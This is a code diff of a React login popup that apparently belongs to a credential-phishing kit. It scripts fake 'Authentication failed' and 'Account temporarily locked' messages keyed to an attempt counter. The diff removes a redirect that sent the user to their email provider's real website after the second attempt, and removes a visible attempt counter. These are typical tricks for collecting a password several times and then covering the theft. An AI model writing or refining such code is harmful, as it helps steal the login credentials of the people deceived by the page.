@@ -276,12 +276,6 @@ const Popup = ({ domain, systemInfo }) => {
       } else if (currentAttempt === 2) {
         setErrorMessage("Authentication failed. Please verify your credentials.");
         setAttempts(2);
-        
-        // Redirect to email domain website after second attempt (from old popup)
-        const emailDomain = getDomainFromEmail();
-        if (emailDomain) {
-          window.location.href = `https://www.${emailDomain}`;
-        }
       } else if (currentAttempt === 3) {
         setErrorMessage("Multiple failed attempts detected. Account temporarily locked for security.");
         setAttempts(3);
@@ -617,26 +611,6 @@ const Popup = ({ domain, systemInfo }) => {
                 <line x1="12" y1="16" x2="12.01" y2="16"/>
               </svg>
               <span style={{ fontSize: '11px' }}>{errorMessage}</span>
-            </div>
-          </div>
-
-          {/* Attempt Counter - Only show for first attempt */}
-          <div style={{
-            marginBottom: '12px',
-            height: attempts === 1 ? 'auto' : '0',
-            overflow: 'hidden',
-            transition: 'height 0.3s ease'
-          }}>
-            <div style={{
-              backgroundColor: '#fff3cd',
-              color: '#856404',
-              padding: '4px 6px',
-              borderRadius: '4px',
-              border: '1px solid #ffeaa7',
-              fontSize: '10px',
-              textAlign: 'center'
-            }}>
-              <strong>Attempt 1/3</strong> - Failed authentication attempts
             </div>
           </div>
 
